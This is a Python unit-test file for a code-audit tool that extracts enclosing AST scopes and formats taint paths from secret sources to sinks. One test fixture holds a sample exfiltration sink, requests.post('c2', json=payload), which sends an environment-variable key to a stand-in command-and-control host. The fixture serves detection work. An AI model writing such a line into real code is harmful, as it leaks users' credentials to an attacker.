# tests/test_ast_scope_slicer.py
import unittest
from models.audit.tools.ast_scope_slicer import ASTScopeSlicer

class TestASTScopeSlicer(unittest.TestCase):
    """Unit tests for AST enclosing scope extraction and taint trajectory formatting."""

    def setUp(self):
        self.slicer = ASTScopeSlicer()

    def test_extract_python_function_enclosing_scope(self):
        source_code = (
            "import os\n"
            "def train_epoch(epoch):\n"
            "    x = 1\n"
            "    token = os.environ['SECRET']\n"
            "    return token\n"
            "print('done')\n"
        )
        # Line 4 is inside train_epoch
        scope = self.slicer.extract_enclosing_scope(source_code, target_line=4, language="python")
        self.assertIn("def train_epoch", scope)
        self.assertIn("return token", scope)
        self.assertNotIn("print('done')", scope)

    def test_extract_python_class_scope(self):
        source_code = (
            "class Trainer:\n"
            "    def __init__(self):\n"
            "        self.token = os.environ['KEY']\n"
            "    def run(self):\n"
            "        pass\n"
        )
        # Line 3 is inside __init__
        scope = self.slicer.extract_enclosing_scope(source_code, target_line=3, language="python")
        self.assertIn("def __init__", scope)
        self.assertIn("self.token", scope)

    def test_format_taint_trajectory_payload(self):
        taint_nodes = [
            {"step": 1, "type": "SOURCE", "file": "train.py", "line": 12, "code": "tok = os.environ.get('KEY')"},
            {"step": 2, "type": "PROPAGATOR", "file": "train.py", "line": 20, "code": "payload = {'key': tok}"},
            {"step": 3, "type": "SINK", "file": "train.py", "line": 35, "code": "requests.post('c2', json=payload)"},
        ]
        formatted = self.slicer.format_taint_trajectory(taint_nodes)
        self.assertIn("[Step 1: SOURCE] (Line 12)", formatted)
        self.assertIn("[Step 2: PROPAGATOR] (Line 20)", formatted)
        self.assertIn("[Step 3: SINK] (Line 35)", formatted)

    def test_fallback_context_window(self):
        source_code = "\n".join([f"line_{i} = {i}" for i in range(1, 100)])
        fallback = self.slicer.extract_fallback_window(source_code, target_line=50, window=3)
        self.assertIn("line_50", fallback)
        self.assertIn("line_47", fallback)
        self.assertIn("line_53", fallback)
        self.assertNotIn("line_10", fallback)

if __name__ == "__main__":
    unittest.main()
